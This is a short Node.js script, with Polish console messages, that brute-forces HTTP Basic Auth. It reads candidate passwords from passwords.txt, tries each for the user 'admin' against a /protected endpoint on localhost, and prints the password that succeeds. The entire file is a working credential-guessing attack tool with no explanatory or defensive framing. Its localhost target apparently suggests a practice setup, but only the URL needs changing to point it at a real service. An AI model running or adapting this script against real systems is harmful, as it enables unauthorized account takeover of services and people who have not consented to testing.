const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

const url = 'http://localhost:3000/protected';
const username = 'admin';

async function makeRequest(username, password) {
  try {
    const response = await axios.get(url, {
      auth: { username: username, password: password }
    });
    console.log(`wielki sukces! hasło to: ${password}`);
    return true;
  } catch (error) {
    console.log(`Nie udało się zalogować hasłem: ${password}`);
    return false;
  }
}

async function bruteForce() {
  const fileStream = fs.createReadStream('passwords.txt');
  const rl = readline.createInterface({ input: fileStream });

  for await (const password of rl) {
    const result = await makeRequest(username, password);
    if (result) {
      break;
    }
  }
}

bruteForce();
